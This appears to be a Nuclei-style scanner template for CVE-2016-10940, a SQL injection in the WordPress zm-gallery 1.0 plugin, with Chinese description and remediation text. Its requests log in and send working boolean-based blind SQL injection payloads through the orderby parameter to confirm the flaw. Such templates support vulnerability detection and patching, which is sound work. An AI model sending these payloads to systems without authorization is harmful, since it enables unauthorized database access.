id: CVE-2016-10940
info:
  name: WordPress zm-gallery plugin 1.0 SQL Injection
  author:
  - l0ne1y
  tags:
  - cve
  - cve2016
  - sqli
  - wp
  - wordpress
  - wp-plugin
  - authenticated
  description: |-
    WordPress Plugin zm-gallery SQL注入漏洞
    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。zm-gallery是使用在其中的一个图片库插件。

    WordPress zm-gallery插件1.0版本中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。
  reference:
  - https://wpscan.com/vulnerability/c0cbd314-0f4f-47db-911d-9b2e974bd0f6
  - https://lenonleite.com.br/en/2016/12/16/zm-gallery-1-plugin-wordpress-blind-injection/
  - https://nvd.nist.gov/vuln/detail/cve-2016-10940
  - http://lenonleite.com.br/en/2016/12/16/zm-gallery-1-plugin-wordpress-blind-injection/
  severity: high
  classification:
    cve-id:
    - cve-2016-10940
    cwe-id:
    - cwe-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/zm-gallery/

    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code_1 == 302 && status_code_2 == 200 && status_code_3 == 200
    - contains(body_2, "[zm_gallery id=")
    - contains(body_2, "<th scope=\"row\" class=\"check-column\">")
    - '!contains(body_3, "<th scope=\"row\" class=\"check-column\">")'
  raw:
  - |
    POST /wp-login.php HTTP/1.1
    Host: {{Hostname}}
    Origin: {{RootURL}}
    Content-Type: application/x-www-form-urlencoded
    Cookie: wordpress_test_cookie=WP%20Cookie%20check

    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
  - |
    GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7422)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7421)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
    Host: {{Hostname}}
  cookie-reuse: true
  req-condition: true
